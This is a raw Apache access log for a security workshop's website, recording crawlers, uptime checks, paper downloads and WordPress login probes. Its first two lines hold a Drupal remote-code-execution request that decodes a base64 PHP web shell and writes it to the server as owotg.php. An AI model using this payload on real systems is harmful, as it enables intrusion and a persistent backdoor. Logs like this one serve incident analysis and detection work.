59.124.153.166 - - [30/Apr/2018:10:07:48 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:10:07:49 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6217 "-" "curl/7.47.0"
37.183.109.16 - - [30/Apr/2018:10:07:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.183.109.16 - - [30/Apr/2018:10:07:53 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:10:10:10 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
199.16.157.181 - - [30/Apr/2018:10:12:39 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
41.235.17.41 - - [30/Apr/2018:10:12:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.235.17.41 - - [30/Apr/2018:10:12:45 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:10:14:18 -0400] "GET /2009/proceedings/2010/nspw2010-coles.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:10:15:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.54 - - [30/Apr/2018:10:15:13 -0400] "GET /cfp/nspw2018-cfp.pdf HTTP/1.1" 200 99689 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
163.117.204.35 - - [30/Apr/2018:10:15:41 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "https://www.google.es/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
163.117.204.35 - - [30/Apr/2018:10:15:42 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2009/nspw2009-herley.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
34.207.239.213 - - [30/Apr/2018:10:16:10 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 200 188987 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
5.12.251.180 - - [30/Apr/2018:10:18:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.12.251.180 - - [30/Apr/2018:10:18:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:10:18:52 -0400] "GET /papers/2005/nspw2005-ford.pdf HTTP/1.1" 200 2046407 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.241.232.47 - - [30/Apr/2018:10:19:28 -0400] "GET /robots.txt HTTP/1.0" 200 5905 "http://nspw.org/robots.txt" "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)"
69.162.124.227 - - [30/Apr/2018:10:20:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
